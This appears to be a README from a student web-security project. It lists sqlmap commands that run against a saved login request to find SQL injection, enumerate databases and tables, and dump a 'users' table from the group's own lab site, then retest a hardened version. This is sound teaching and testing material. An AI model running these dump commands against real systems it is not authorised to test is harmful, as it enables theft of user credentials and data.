download sqlmap from: https://sqlmap.org/
how to use it: https://github.com/sqlmapproject/sqlmap

you should copy login_request.txt into the sqlmap folder that you downloaded

1. python sqlmap.py -r login_request.txt --batch  【Run sqlmap and use batch mode】

2.  python sqlmap.py -r login_request.txt --batch --dbs    【Listing database】

3.  python sqlmap.py -r login_request.txt --batch -D security_group_10 --tables    【listing tables】

4.  python sqlmap.py -r login_request.txt --batch -D security_group_10 -T users --dump  【listing data】


Now to test the improved web (safe web), note that you need to clear the previous session
5.  python sqlmap.py --flush-session --batch -r login_request_forsafeweb.txt

Further test [very very slow]
python sqlmap.py -r login_request_forsafeweb.txt --batch --level=5 --risk=3 --random-agent

log1.txt and log2.txt record the result obtained after successful sqlmap attack on web pages



